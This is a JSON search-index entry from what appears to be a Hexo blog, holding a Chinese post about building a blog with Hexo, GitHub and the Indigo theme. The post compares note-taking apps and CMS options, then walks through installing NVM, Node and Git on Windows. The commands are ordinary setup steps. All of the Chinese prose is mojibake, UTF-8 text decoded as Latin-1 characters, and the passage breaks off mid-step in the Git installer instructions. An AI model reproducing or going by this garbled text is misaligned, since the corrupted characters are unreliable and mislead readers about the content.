[{"title":"Hexo+GitHub+Indigo ä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°","url":"/2023/06/13/å­¦ä¹ è®°å½•/Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/","content":"\n# å‰è¨€\n\nå¹³æ—¶æ²¡æœ‰ä»€ä¹ˆåšè®°å½•çš„ä¹ æƒ¯ï¼Œä½†è¿™ä¹ æƒ¯ä¸å¤ªå¥½ï¼Œæ‰€ä»¥æ­å»ºäº†ä¸ªåšå®¢æ¥æ”¹æ‰è¿™ä¸ªä¸å¥½çš„ä¹ æƒ¯ã€‚\n\nåœ¨æ­å»ºåšå®¢çš„æ—¶å€™ï¼Œæˆ‘åšäº†æ¯”è¾ƒå¤šçš„é€‰æ‹©ï¼Œå…ˆè¯´è¯´æˆ‘é€‰æ‹©æ¯ä¸ªä¸åŒçš„ cms çš„å–èˆä»¥åŠå®ƒä»¬çš„ä¼˜ç¼ºç‚¹ã€‚\n\n## Wordpress\n\nWoredpress å…¶å®æ˜¯æˆ‘ä¼˜å…ˆè€ƒè™‘çš„ cmsï¼Œä½†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæ˜¯æœåŠ¡å™¨éœ€è¦ç»´æŠ¤ï¼Œå…¶æ¬¡å‘¢æ¯•ç«Ÿæˆ‘ä¹Ÿæ˜¯æå®‰å…¨çš„æ˜¯å§ï¼Œç¡®å®å­˜åœ¨è¢«æ”»å‡»çš„é£é™©ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆè¢«æˆ‘æ”¾å¼ƒäº†ã€‚\n\n## html é™æ€æ–‡ä»¶\n\nå…¶æ¬¡æˆ‘è€ƒè™‘çš„æ˜¯ html é™æ€æ–‡ä»¶ï¼Œä½†ç›¸å¯¹çš„é¦–å…ˆä¹Ÿæ˜¯éœ€è¦ç»´æŠ¤æœåŠ¡å™¨ï¼Œä¹Ÿæ˜¯ä¸€ç¬”è´¹ç”¨å•Šï¼Œä¼—æ‰€å‘¨çŸ¥æˆ‘è¿™ç§ç©·é¬¼è‚¯å®šæ˜¯èˆä¸å¾—å‡ºè¿™ä¸ªé’±çš„æ˜¯å§ï¼Ÿè€Œä¸” html é™æ€æ–‡ä»¶æ¯æ¬¡æ›´æ–°ç¡®å®ç›¸å¯¹æ˜¯æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆä¹Ÿè¢«æˆ‘æ”¾å¼ƒäº†ã€‚\n\n## Notion ç­‰ç¬”è®°å·¥å…·\n\næˆ‘ä¸ªäººå¯¹ç¬”è®°å·¥å…·çš„ä½¿ç”¨åº¦æ˜¯ç›¸å¯¹æ¯”è¾ƒé«˜çš„ï¼Œè¿™é‡Œæˆ‘ç”¨è¿‡çš„æœ‰ Notionã€å°è±¡ç¬”è®°ã€æœ‰é“ç¬”è®°ã€ä¸ºçŸ¥ç¬”è®°ã€OneNoteã€è¯­é›€ç­‰ï¼Œæˆ‘å…ˆè®²è®²å„è‡ªçš„ä¼˜ç¼ºç‚¹å’Œä½¿ç”¨æ„Ÿå—å§\n\n1. Notion\n   - ä¼˜ç‚¹ï¼šæˆ‘è®¤ä¸º Notion ç¡®å®å¯ä»¥ç§°å¾—ä¸Šæœ‰å²ä»¥æ¥æœ€å¼ºå¤§çš„ç¬”è®°è½¯ä»¶ï¼ŒåŸºäºé¢å‘å¯¹è±¡çš„è®¾è®¡æ€è·¯ï¼Œé¡µé¢åµŒå¥—æ²¡æœ‰é™åˆ¶ï¼Œä½¿ç”¨ç©ºé—´æ²¡æœ‰é™åˆ¶ï¼Œå¤§å¤šæ•°ç¬”è®°è½¯ä»¶ä»˜è´¹çš„åŠŸèƒ½åœ¨ Notion ä¸Šéƒ½å¯ä»¥å…è´¹ä½¿ç”¨ã€‚Notion çš„äº®ç‚¹è¿˜åœ¨äºå…¶å€ŸåŠ©æ•°æ®åº“è¡¨æ ¼çš„æ”¯æŒï¼Œå¯ä»¥è¡ç”Ÿå‡ºå¾ˆå¤šä¸åŒçš„ç©æ³•ã€‚\n   - ç¼ºç‚¹ï¼šä¸Šæ‰‹éš¾åº¦è¾ƒé«˜ï¼Œä½†æˆ‘è®¤ä¸ºè¿™ä¸æ˜¯è½¯ä»¶çš„ç¼ºç‚¹ï¼Œè€Œæ˜¯ä½¿ç”¨è€…çš„ç¼ºç‚¹ã€‚æœåŠ¡å™¨åœ¨å¢ƒå¤–ï¼Œå§‹ç»ˆå¯¹å›½å†…è¿˜æ˜¯æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå‹å¥½ï¼Œä¸”åŸç”Ÿç¯å¢ƒæ˜¯ä¸æ”¯æŒä¸­æ–‡çš„ï¼Œä½†æ˜¯è¿™ä¸€ç‚¹å¯ä»¥å€ŸåŠ©æœ‰çŒ´è„šæœ¬è¿›è¡Œä¸­æ–‡ç•Œé¢ç¿»è¯‘ã€‚ä½†è®©æˆ‘æœ€æ— æ³•æ¥å—çš„ä¸€ç‚¹æ˜¯æ•°æ®æ²¡æ‹¿åœ¨è‡ªå·±æ‰‹é‡Œï¼Œå¯¹äºæˆ‘è¿™ç§ä»“é¼ ç”¨æˆ·æ¥è¯´å¿ƒé‡Œæ˜¯æ²¡æœ‰åº•çš„ï¼Œå°±æ€•æœ‰ä¸€å¤©æ‰‹é‡Œçš„æ•°æ®å°±æ²¡äº†ï¼Œæ¯•ç«Ÿæˆ‘æœ‰è¿‡ç™¾åº¦ç½‘ç›˜ç›´æ¥æ¸…ç©ºæˆ‘æ•´ä¸ªç½‘ç›˜çš„ç»å†ï¼Œä¸¢å¤±äº†å¾ˆå¤šçš„æ•°æ®ï¼Œæ‰€ä»¥è¿™ä¸€ç‚¹åœ¨æˆ‘çœ‹æ¥æ˜¯æ— æ³•æ¥å—çš„ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šéå¸¸æ£’çš„ç¬”è®°è½¯ä»¶ï¼Œæ”¯æŒåº¦å¾ˆå¥½ï¼Œä¹Ÿè®©æˆ‘æ‰¾åˆ°äº†å¾ˆå¤šå…¶ä»–ç¬”è®°è½¯ä»¶æ— æ³•å¸¦ç»™æˆ‘çš„ç©æ³•ï¼Œç”šè‡³å·²ç»è¶…è¶Šäº†ç¬”è®°è½¯ä»¶ã€‚ç»“åˆ Siri å’Œå¿«æ·æŒ‡ä»¤å·²ç»æ›¿ä»£äº†æˆ‘æ‰‹æœºé‡Œçš„è®°è´¦å·¥å…·ã€å¥åº·ç®¡ç†å·¥å…·ã€å¤‡å¿˜å½•ç­‰å¾ˆå¤š APPï¼Œéƒ½å·²ç»è‡ªå·±é€šè¿‡ Notion çš„æ•°æ®åº“è¡¨æ ¼åŠŸèƒ½å®ç°äº†å®šåˆ¶åŒ–ã€‚\n2. å°è±¡ç¬”è®°\n   - ä¼˜ç‚¹ï¼šä½¿ç”¨ç®€å•ã€é£æ ¼åè°ƒè®¾è®¡åˆç†ã€å¼ºå¤§çš„æœç´¢åŠŸèƒ½ã€ç²¾è‡´çš„ä¹¦ç­¾æ’ä»¶ï¼Œç»“åˆæ’ä»¶å¯ä»¥å®Œç¾ä¿å­˜ç½‘ä¸Šçœ‹åˆ°çš„æ–‡ç« ï¼Œè¿™æ˜¯è®©äººå¾ˆå¿ƒåŠ¨çš„åŠŸèƒ½ã€‚\n   - ç¼ºç‚¹ï¼šç›®å½•å±‚æ¬¡å¤ªæµ…ï¼Œæ— æ³•æ»¡è¶³æ·±å±‚æ¬¡ä½¿ç”¨ã€‚å›½å†…ç‰ˆå’Œå›½å¤–ç‰ˆå·®åˆ«è¿‡å¤§ï¼Œæˆ‘ä¸å¤ªå–œæ¬¢è¿™ç§æŠŠå®¢æˆ·åˆ†å±‚çš„æ„Ÿè§‰ï¼Œå°±æ¯”å¦‚ä¸€ä¸ªåŠŸèƒ½ï¼Œå¤§å®¶éƒ½æ²¡æœ‰é‚£æˆ‘å¯ä»¥æ¥å—ï¼Œä½†åˆ«äººå¯ä»¥ç”¨æˆ‘ä¸èƒ½ç”¨æˆ‘å°±æ— æ³•æ¥å—è¿™ç§æƒ…å†µã€‚å…è´¹ç‰ˆæ”¯æŒçš„è®¾å¤‡ä¸Šé™å¤ªå°‘ï¼Œæˆ‘ä¸ªäººçš„ä½¿ç”¨ç¯å¢ƒå¸¸ç”¨çš„ç”µè„‘ä¸æ­¢ä¸€å°ï¼Œå†åŠ ä¸Š iPad å’Œæ‰‹æœºï¼Œæ— æ³•è¾¾æˆä¸€ä¸ªæ¯”è¾ƒå¥½çš„åè°ƒï¼Œå½“ç„¶è¿™æ˜¯æˆ‘ä¸ªäººçš„é—®é¢˜ï¼Œä¹Ÿæ˜¯æˆ‘ä¸æ„¿æ„åœ¨è¿™ç±»äº§å“ä¸Šä»˜è´¹ï¼Œè¿™ä¸æ˜¯è½¯ä»¶çš„é—®é¢˜ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šç›¸å¯¹æ¯”è¾ƒä¸é”™ï¼Œä½†ä»…æ˜¯ä¸ºäº†æ”¯æŒæ›´å¤šè®¾å¤‡è€Œè®©æˆ‘ä»˜è´¹ï¼Œè¿™ä¹ˆä¸€ç‚¹åŠŸèƒ½æ— æ³•è®©æˆ‘ä»˜è´¹ã€‚æˆ‘è®¤ä¸ºä¸€æ¬¾äº§å“è‡³å°‘å¾—è§£å†³æˆ‘ç°æœ‰æ— æ³•è§£å†³çš„æƒ…å†µï¼Œæ‰å€¼å¾—æˆ‘ä»˜è´¹ï¼Œè€Œä¸”è¿˜å¾—æ˜¯åŒç±»äº§å“é‡Œç›¸å¯¹æ¯”è¾ƒä¼˜ç§€çš„äº§å“æ‰è¡Œã€‚\n3. æœ‰é“ç¬”è®°\n   - ä¼˜ç‚¹ï¼šä¸°å¯Œçš„åŠŸèƒ½ç‚¹ï¼Œè¾ƒå¤§çš„å…è´¹ä½¿ç”¨ç©ºé—´ï¼Œè¶³å¤Ÿå¤§éƒ¨åˆ†äººçš„æ—¥å¸¸ä½¿ç”¨äº†ã€‚æ”¯æŒç›®å½•æ— é™åµŒå¥—ã€æ”¯æŒååŒè¡¨æ ¼ã€è„‘å›¾ã€æ¨¡æ¿ã€Markdownã€ç½‘é¡µå‰ªè¾‘ã€æˆªå›¾ã€ç¬”è®°åŠ å¯†ã€ç¿»è¯‘ç­‰ä¸€ç³»åˆ—éå¸¸ä¸é”™çš„åŠŸèƒ½ã€‚æ»¡è¶³å¤§éƒ¨åˆ†äººçš„ä½¿ç”¨åœºæ™¯ã€‚\n   - ç¼ºç‚¹ï¼šæˆ‘è‡ªå·±ä½¿ç”¨ï¼Œç”¨ä¸åˆ°ååŒåŠå…¬ï¼Œæ‰€ä»¥ç›¸å¯¹æ¥è¯´å¯¹æˆ‘æ²¡æœ‰å¸å¼•åŠ›ã€‚æ•´ä½“è®¾è®¡ã€ç¼–è¾‘å™¨è®¾è®¡æœ‰æ‰€æ¬ ç¼ºï¼ŒåŸºç¡€ä½“éªŒç›¸å¯¹ä¸æ˜¯å¾ˆå¥½ï¼Œç•Œé¢å¯¹æˆ‘æ¥è¯´ä¼˜ç‚¹è¿‡äºâ€œä¸‘é™‹â€ï¼Œæ˜¯æˆ‘æ¯”è¾ƒæ— æ³•æ¥å—çš„ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šåŠŸèƒ½ä¸é”™ï¼Œä½†ç•Œé¢ä¸‘é™‹æˆ‘æ˜¯çœŸçš„æ— æ³•æ¥å—ï¼Œä¸è¿‡æ”¯æŒå¤šè®¾å¤‡è¿™ä¸€ç‚¹æ˜¯ä¸€ä¸ªæ¯”è¾ƒä¸é”™çš„ä¼˜ç‚¹ã€‚\n4. ä¸ºçŸ¥ç¬”è®°\n   - ä¼˜ç‚¹ï¼šé£æ ¼ç®€æ´ç´ é›…ã€å±‚æ¬¡åˆ†æ˜ï¼Œè‡ªå¸¦å­¦æœ¯æ°”è´¨ï¼Œè½¯ä»¶ç•Œé¢ã€äº¤äº’æ–¹é¢è®¾è®¡çš„å¾ˆç²¾è‡´ï¼Œæ˜¯æˆ‘å–œæ¬¢çš„é£æ ¼ã€‚æ”¯æŒæ— é™åµŒå¥—ï¼Œå¯¹ Markdown çš„æ”¯æŒåº¦æ¯”è¾ƒé«˜ï¼Œæ¯”è¾ƒå‹å¥½ã€‚å¹¶ä¸”æœ€å¤§çš„ä¸€ä¸ªäº®ç‚¹å°±æ˜¯å¯ä»¥ä½¿ç”¨è‡ªå·±çš„æœåŠ¡å™¨ï¼Œä½¿ç”¨ Docker æ­å»ºå¥½ä¸ºçŸ¥ç¬”è®°çš„æœåŠ¡å™¨å³å¯ã€‚\n   - ç¼ºç‚¹ï¼šä¸æ”¯æŒæ€ç»´å¯¼å›¾ï¼Œè‡ªå¸¦çš„è„‘å›¾åŠŸèƒ½å¯¼å‡ºçš„ç•Œé¢ç›¸å¯¹æ¯”è¾ƒè¿·ã€‚å¤šè®¾å¤‡ä¹‹é—´çš„åŒæ­¥æ˜¯æœ‰ç‚¹é—®é¢˜çš„ï¼Œæ— æ³•åšåˆ°å¾ˆå®Œç¾çš„è¿›è¡ŒåŒæ­¥ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šä¸ºçŸ¥ç¬”è®°å¦‚ä»Šæ˜¯æˆ‘çš„ä¸»åŠ›ç¬”è®°è½¯ä»¶ï¼Œç”¨è‡ªå·±çš„æœåŠ¡å™¨è¿™ä¸€ç‚¹æ˜¯æœ€å¸å¼•æˆ‘çš„ç‚¹ï¼Œæ•°æ®åœ¨è‡ªå·±æ‰‹é‡Œæ‰æ˜¯æœ€æ”¾å¿ƒçš„ã€‚\n5. OneNote\n   - ä¼˜ç‚¹ï¼šWindows 10 è‡ªå¸¦çš„ç¬”è®°è½¯ä»¶ï¼Œæ¼‚äº®ã€å…è´¹ï¼ŒOneNote çš„ç»“æ„ä¸äº¤äº’é£æ ¼ä¸ä¸€èˆ¬çš„ç¬”è®°è½¯ä»¶ä¸ä¸€æ ·ï¼Œç•Œé¢ç¼–è¾‘çµæ´»ã€‚\n   - ç¼ºç‚¹ï¼šæ¯•ç«ŸæœåŠ¡å™¨åœ¨å›½å¤–ï¼Œå›½å†…ç”¨æˆ·ä½¿ç”¨çš„è¯åŒæ­¥é€Ÿåº¦å’Œè¿æ¥é€Ÿåº¦ä¸å¤ªç¨³å®šï¼Œè€Œä¸”æ¯•ç«Ÿæ˜¯ 2003 å¹´çš„â€œå¤§å”â€äº§å“ï¼Œç›¸å¯¹æ¥è¯´æœ‰ä¸€ç‚¹è¿‡æ—¶äº†ï¼Œæ— æ³•æ»¡è¶³ç°åœ¨çš„éƒ¨åˆ†éœ€æ±‚ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šåŒæ­¥çœŸçš„ä¸€è¨€éš¾å°½ï¼Œæˆ‘æ˜¯æ²¡ç”¨å¤šä¹…å°±æ”¾å¼ƒäº†ã€‚\n6. è¯­é›€\n   - ä¼˜ç‚¹ï¼šä¸»æ‰“çŸ¥è¯†åº“å»ºè®¾ï¼Œå¯ä»¥åˆ›å»ºä¸ªäººçŸ¥è¯†åº“ã€ååŒçŸ¥è¯†åº“ä»¥åŠçŸ¥è¯†å°ç»„ï¼Œå¯ä»¥æä¾›ä¸åŒçš„çŸ¥è¯†åº“æ¨¡æ¿ï¼Œå›¢é˜Ÿåä½œä¸Šç¡®å®ä¸é”™ã€‚\n   - ç¼ºç‚¹ï¼šæ˜¯å®ƒçš„ä¼˜ç‚¹ï¼Œä½†ä¹Ÿæ˜¯ç¼ºç‚¹ï¼Œå°±æ˜¯æ‰åˆçš„åŠŸèƒ½å¤ªå¤šï¼Œæ˜¾å¾—è¿‡äºæ‚ä¹±ï¼Œä¸æ˜¯æˆ‘å–œæ¬¢çš„é£æ ¼ã€‚\n   - ä½¿ç”¨ä½“éªŒï¼šæˆ‘ä¸ªäººè¯„ä»·æ˜¯ï¼Œè¿™æ˜¯ä¸€æ¬¾å›½äº§åŒ–çš„ Notionï¼Œå¹¶ä¸”é€‚é…äº†å›¢é˜ŸåŠå…¬çš„éœ€æ±‚ã€‚\n\n## å¾®ä¿¡å…¬ä¼—å·\n\næ²¡é”™ï¼Œåœ¨ä½“éªŒäº†é‚£ä¹ˆå¤šä»¥åï¼Œæˆ‘è¿˜æ˜¯é€‰æ‹©å¼€äº†ä¸ªå¾®ä¿¡å…¬ä¼—å·æ¥è®°å½•å’Œå‘å¸ƒæ–‡ç« ã€‚\n\nä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¾®ä¿¡å…¬ä¼—å·æ¯å¤©åªèƒ½æ¨é€ä¸€ç¯‡æ–‡ç« ï¼Œè€Œä¸”å¾®ä¿¡å…¬ä¼—å·æ˜¯ä¸æ”¯æŒ Markdown çš„ï¼Œåªèƒ½é€šè¿‡ç¬¬ä¸‰æ–¹å¹³å°è¿›è¡Œè½¬æ¢ï¼Œä½†æ˜¯æ¯æ¬¡æå›¾ç‰‡ä»€ä¹ˆçš„éº»çƒ¦æ­»äº†ã€‚\n\n## Hexo\n\nè¯´äº†è¿™ä¹ˆå¤šï¼Œç»ˆäºå›åˆ°äº†æˆ‘ä»¬çš„ä¸»é¢˜ï¼Œé‚£å°±æ˜¯ï¼šHexo\n\nHexo æ˜¯ä¸€æ¬¾é«˜é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æ¶ã€‚Hexo ä½¿ç”¨ Markdown è§£ææ–‡ç« ï¼Œåœ¨å‡ ç§’å†…å³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚å¹¶ä¸” Hexo æœ‰å¤§é‡çš„æ’ä»¶ä½œä¸ºæ”¯æŒï¼Œæ˜¯ä¸å¯å¤šå¾—çš„é€‰æ‹©ã€‚\n\nHexo å…¶å®å°±å®ç°äº†æˆ‘ä½¿ç”¨ Html é™æ€æ–‡ä»¶ä½œä¸ºåšå®¢çš„æƒ³æ³•ï¼ŒåŒæ—¶æ–°å¢æ–‡æ¡£ä¹Ÿä¸éº»çƒ¦ï¼Œè¿˜æ–¹ä¾¿ç¼–è¾‘ï¼Œå†åŠ ä¸Šæˆ‘æ—¥å¸¸ä½¿ç”¨çš„ç¬”è®°ä¹Ÿæ°å¥½æ˜¯ Markdownï¼Œæ‰€ä»¥åªéœ€è¦åšä¸€ä¸ªå¾ˆç®€å•çš„ç§»æ¤å³å¯æŠŠæˆ‘çš„æ–‡ç« éƒ½ç§»æ¤åˆ° Hexo æ­å»ºçš„åšå®¢ä¸Šã€‚\n\n# Hexo æ­å»ºåšå®¢\n\n## Hexo ç¯å¢ƒå®‰è£…\n\n### Windows\n\n#### å®‰è£… NVM\n\nè¿›å…¥ NVM-Windows æœ€æ–°å‘å¸ƒåœ°å€ï¼šhttps://github.com/coreybutler/nvm-windows/releases\n\né€‰æ‹©æœ€æ–°å‘è¡Œç‰ˆè¿›è¡Œä¸‹è½½ï¼š\n\n![image-20230520194028396](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194028396.png)\n\nä¸‹è½½çš„ exe å¯æ‰§è¡Œæ–‡ä»¶å°±ç›´æ¥æ‰“å¼€ï¼Œä¸‹è½½çš„ zip å‹ç¼©æ–‡ä»¶å°±å…ˆè§£å‹ï¼Œç„¶åæ‰“å¼€ç‚¹å‡»å®‰è£…\n\næ³¨æ„ï¼šNVM çš„å®‰è£…è·¯å¾„ä¸‹ä¸è¦æœ‰ä¸­æ–‡\n\n![image-20230520194254234](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194254234.png)\n\nNVM é…ç½®æ–‡ä»¶åœ°å€ä¹Ÿä¸è¦æœ‰ä¸­æ–‡\n\n![image-20230520194311113](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194311113.png)\n\nå®‰è£…å®Œæˆåï¼Œåœ¨ CMD æˆ–è€… Powershell ä¸‹è¾“å…¥ NVMï¼Œå³å¯çœ‹åˆ°å®‰è£…å®Œæˆï¼š\n\n![image-20230520194403885](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194403885.png)\n\n#### é…ç½®å›½å†…æº\n\nå›½å†…è¿™è¾¹è¿æ¥ NVM å’Œ Node æºæ¯”è¾ƒæ…¢ï¼Œæˆ‘ä»¬æ¢æˆå›½å†…æºï¼š\n\n```\n# nodeä½¿ç”¨æ·˜å®æº\nnode_mirror: http://npm.taobao.org/mirrors/node/ \n# npmä½¿ç”¨æ·˜å®æº\nnpm_mirror: https://npm.taobao.org/mirrors/npm/\n```\n\n![image-20230520194700530](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194700530.png)\n\n#### å®‰è£… Node\n\né¦–å…ˆè¾“å…¥\n\n```\nnvm list\n```\n\næŸ¥çœ‹å®‰è£…çš„ç‰ˆæœ¬ï¼Œç›®å‰æ˜¯æ²¡æœ‰å®‰è£…ä»»ä½•ç‰ˆæœ¬çš„\n\n![image-20230520194812513](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194812513.png)\n\nä¹‹åæˆ‘ä»¬å®‰è£… v12.21 ç‰ˆæœ¬çš„ node\n\n```\nnvm install 12.21\n```\n\n![image-20230520194903460](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520194903460.png)\n\nç„¶åå°±å®‰è£…å¥½äº† NVM\n\n```\nnvm use 12.21.0\n```\n\né€‰æ‹©è¦ä½¿ç”¨çš„ node ç‰ˆæœ¬ï¼Œå³å¯\n\n#### å®‰è£… Git\n\n> https://git-scm.com/download/win\n\n![image-20230520201308301](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520201308301.png)\n\nä¸‹è½½åè¿›è¡Œå®‰è£…\n\n1. è®¸å¯å£°æ˜\n\n   ![image-20230520201703466](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520201703466.png)\n\n   ç‚¹å‡» â€œNextâ€ ä¸‹ä¸€æ­¥\n\n2. é€‰æ‹©å®‰è£…è·¯å¾„\n\n   ![image-20230520201729238](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230520201729238.png)\n\n   æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©å®‰è£…è·¯å¾„\n\n3. é€‰æ‹©å®‰è£…ç»„ä»¶\n\n   ![image-20230612232832319](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230612232832319.png)\n\n   1. é»˜è®¤å‹¾é€‰çš„é€‰é¡¹ï¼Œå»ºè®®ä¸è¦åŠ¨ã€‚é»˜è®¤å®‰è£…äº†ä¸€äº›ç»„ä»¶ Git Bashã€Git GUI ä»¥åŠ Git LFS è¿˜æœ‰æ¡Œé¢å¿«æ·æ–¹å¼ä»¥åŠé…ç½®æ–‡ä»¶é»˜è®¤çš„æ–‡æœ¬ç¼–è¾‘ï¼Œä½¿ç”¨ sh è„šæœ¬å¯åŠ¨ Git Bash\n   2. çº¢è‰²æ¡†å†³å®šåœ¨æ‰€æœ‰æ§åˆ¶å°çª—å£ä¸­ä½¿ç”¨ TrueType å­—ä½“å’Œæ˜¯å¦æ¯å¤©æ£€æŸ¥ Git æ˜¯å¦æœ‰ Windows æ›´æ–°ï¼ŒæŒ‰éœ€å‹¾é€‰\n\n4. é€‰æ‹©å¼€å§‹èœå•ç›®å½•\n\n   ![image-20230522090430839](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522090430839.png)\n\n   é»˜è®¤ Git å³å¯ï¼Œç›´æ¥ Next ä¸‹ä¸€æ­¥\n\n5. é€‰æ‹© Git æ–‡ä»¶é»˜è®¤çš„ç¼–è¾‘å™¨\n\n   ![image-20230522090524960](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522090524960.png)\n\n   å¾ˆå°‘ç”¨åˆ°ï¼Œæ‰€ä»¥é»˜è®¤ Vim å³å¯ï¼Œç›´æ¥ç‚¹å‡» Next ä¸‹ä¸€æ­¥\n\n6. é€‰æ‹© Git åˆå§‹åŒ–åˆ†æ”¯çš„åç§°\n\n   ![image-20230522090603162](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522090603162.png)\n\n   1. Git é»˜è®¤çš„åˆå§‹åŒ–åˆ†æ”¯åç§°ä¸º â€œmasterâ€\n   2. æ ¹æ®è‡ªå·±é¡¹ç›®ä¸šåŠ¡é‡æ–°å‘½åï¼Œå¦‚ï¼šmainã€trunk æˆ–è€…è‡ªå·±å¡«å†™\n   3. å·²å­˜åœ¨çš„é¡¹ç›®ä¸å—å½±å“\n\n7. é€‰æ‹©ä½¿ç”¨ Git çš„æ–¹å¼\n\n   ![image-20230522090830702](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522090830702.png)\n\n   1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œåªä» Git Bash å‘½ä»¤è¡Œå·¥å…·ä½¿ç”¨ Gitï¼Œä¹Ÿæ˜¯æœ€è°¨æ…çš„é»˜è®¤é€‰é¡¹\n   2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œä»å‘½ä»¤è¡Œæˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶ä½¿ç”¨ Git\n   3. ç¬¬ä¸‰ä¸ªé€‰é¡¹ï¼Œåœ¨å‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨ Git å’Œå¯é€‰çš„ Unix å·¥å…·\n\n8. é€‰æ‹© https ä¼ è¾“åç«¯\n\n   ![image-20230522091109914](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522091109914.png)\n\n   è®© Git ä½¿ç”¨å“ªä¸ª SSL/TLS åº“æ¥è¿›è¡Œ HTTPSè¿æ¥\n\n   1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œä½¿ç”¨ OpenSSL åº“ï¼ŒæœåŠ¡å™¨ cer è¯ä¹¦å°†ä½¿ç”¨ ca åŒ…ä¸­ .crtw æ–‡ä»¶è¿›è¡ŒéªŒè¯é€šè¿‡ï¼Œé»˜è®¤é€‰è¿™ä¸ª\n   2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œä½¿ç”¨æœ¬æœº Windows å®‰å…¨é€šé“åº“ï¼ŒæœåŠ¡å™¨è¯ä¹¦å°†åœ¨ Windows è¯ä¹¦å­˜å‚¨ä¸­è¿›è¡ŒéªŒè¯ã€‚è¿™ä¸ªé€‰é¡¹è¿˜å…è®¸é€šè¿‡ Active Directory åŸŸæœåŠ¡ä½¿ç”¨å…¬å¸å†…éƒ¨æ ¹ CA è¯ä¹¦\n\n9. é…ç½®ç»“æŸè¡Œè½¬æ¢æ–¹å¼\n\n   ![image-20230522092224176](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092224176.png)\n\n   Git åº”è¯¥å¦‚ä½•å¤„ç†æ–‡æœ¬æ–‡ä»¶ä¸­çš„è¡Œç»“å°¾?\n\n   1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œä¸‹æ‹‰æ˜¯è½¬æ¢ Windows é£æ ¼ï¼Œæäº¤è½¬æ¢ ä¸ºiunix é£æ ¼ï¼Œåœ¨ Windows è¿™æ˜¯æ¨èé»˜è®¤çš„è®¾ç½®ã€‚\n   2. ç¬¬äºŒä¸ªé€‰é¡¹ï¼Œä¸‹æ‹‰æ—¶ä¸æ”¹å˜ï¼Œæäº¤è½¬æ¢ä¸º iunix é£æ ¼ã€‚å¯¹äºè·¨å¹³å°é¡¹ç›®ï¼Œè¿™æ˜¯ Unix ä¸Šçš„æ¨èè®¾ç½®ã€‚\n   3. ç¬¬ä¸‰ä¸ªé€‰é¡¹ï¼Œä¸‹æ‹‰å’Œæäº¤éƒ½ä¸è¿›è¡Œä»»ä½•è½¬æ¢ï¼Œå¯¹äºè·¨å¹³å°é¡¹ç›®(â€œæ ¸å¿ƒé¡¹ç›®â€)ï¼Œä¸æ¨èé€‰æ‹©æ­¤é€‰é¡¹ã€‚\n\n10. é…ç½®ç»ˆç«¯æ¨¡æ‹Ÿå™¨ä¸ºä½¿ç”¨ Git Bash\n\n    ![image-20230522092347417](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230522092347417.png)\n\n    1. ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼ŒGit Biash å°†ä½¿ç”¨ MinTTY ä½œä¸ºç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œå®ƒæ‹¥æœ‰ä¸€ä¸ªå¯è°ƒæ•´å¤§å°çš„çª—å£ï¼ŒéçŸ©å½¢çš„é€‰æ‹©å’Œ Unicode å­—ä½“ã€‚Windows æ§åˆ¶å°ç¨‹åº(å¦‚äº¤äº’å¼ Python)å¿…é¡»é€šè¿‡ â€˜winptyâ€™ 